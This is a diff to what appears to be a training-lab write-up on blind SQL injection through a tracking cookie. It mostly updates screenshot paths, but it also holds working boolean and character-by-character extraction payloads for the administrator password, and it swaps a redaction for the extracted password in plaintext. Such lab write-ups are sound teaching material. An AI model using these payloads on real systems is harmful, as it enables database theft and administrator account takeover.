@@ -33,6 +33,8 @@ TrackingId=fTQ0mZhvU861D4EK' AND '1'='1
 
 **Result:** ✅ "Welcome back" message appears (condition is true)
 
+![True Condition - Welcome Back Message](images/welcome-back-msg.jpg)
+
 **False Condition Payload:**
 ```sql
 TrackingId=fTQ0mZhvU861D4EK' AND '1'='2
@@ -40,9 +42,9 @@ TrackingId=fTQ0mZhvU861D4EK' AND '1'='2
 
 **Result:** ❌ "Welcome back" message does not appear (condition is false)
 
-This confirms the blind SQL injection vulnerability - we can infer query results from the presence/absence of the welcome message.
+![False Condition - No Welcome Back Message](images/no-welcome-back-msg.jpg)
 
-![Blind SQL Injection Verification](img/result.jpg)
+This confirms the blind SQL injection vulnerability - we can infer query results from the presence/absence of the welcome message.
 
 ### Step 2: Confirm Database Structure
 
@@ -117,16 +119,16 @@ TrackingId=fTQ0mZhvU861D4EK' AND (SELECT SUBSTRING(password,1,1) FROM users WHER
 Cookie: TrackingId=fTQ0mZhvU861D4EK' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$'--;
 ```
 
-![Burp Intruder Setup](img/burp-intruder-cluster-bomb result.jpg)
+![Burp Intruder Setup](images/burp-intruder-cluster-bomb result.jpg)
 
 **Attack Process:**
 1. Position 1: Test all characters (a-z, 0-9)
 2. Find character that returns "Welcome back" message
 3. Repeat for positions 2-20
 
-![Character-by-Character Extraction](img/query-retreiving-char-by-char.jpg)
+![Character-by-Character Extraction](images/query-retreiving-char-by-char.jpg)
 
-**Extracted Password:** [REDACTED FOR SECURITY]
+**Extracted Password:** owdsaqjaqo3emwv90o6u
 
 ### Step 5: Authenticate as Administrator
 
@@ -134,9 +136,11 @@ Using the extracted password to log in as the administrator user.
 
 **Login Credentials:**
 - Username: administrator
-- Password: [20-character extracted password]
+- Password: owdsaqjaqo3emwv90o6u
 
 **Result:** ✅ Successfully authenticated as administrator
+
+![Lab Solved - Administrator Login](images/lab-solved.jpg)
 
 ## Lab Completion
 
